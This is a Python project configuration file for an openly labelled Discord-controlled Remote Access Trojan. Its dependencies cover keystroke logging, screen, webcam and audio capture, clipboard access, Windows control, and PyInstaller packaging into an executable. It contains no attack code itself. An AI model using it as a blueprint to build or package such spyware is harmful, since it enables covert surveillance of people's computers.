[project]
name = "discord-rat-v2"
version = "0.1.0"
description = "a Remote Access Trojan (RAT) written in python and paired with discord for cloud/collaborative access"
readme = "README.md"
authors = [
    { name = "TaherMustansir1929", email = "eren.jeager1929101@gmail.com" },
]
requires-python = ">=3.14"
dependencies = [
    "certifi>=2026.10.19",
    "comtypes>=1.4.17",
    "discord>=2.3.2",
    "imageio>=2.38.1",
    "imageio-ffmpeg>=0.6.0",
    "monitorcontrol>=4.2.0",
    "mss>=10.2.0",
    "numpy>=2.5.4",
    "opencv-python>=5.0.0.93",
    "pillow>=13.0.0",
    "psutil>=7.2.2",
    "pyautogui>=0.9.54",
    "pycaw>=20260927",
    "pyperclip>=1.9.0",
    "pynput>=1.8.2",
    "pyscreeze>=1.0.1",
    "python-dotenv>=1.2.4",
    "pywin32>=312",
    "requests>=2.34.2",
    "sounddevice>=0.5.6",
    "pynacl>=1.6.2",
    "davey>=0.1.7",
]

[project.scripts]
discord-rat-v2 = "discord_rat_v2:main"

[build-system]
requires = ["uv_build>=0.12.5,<0.13.0"]
build-backend = "uv_build"

[dependency-groups]
dev = [
    "pyinstaller>=6.22.3",
]
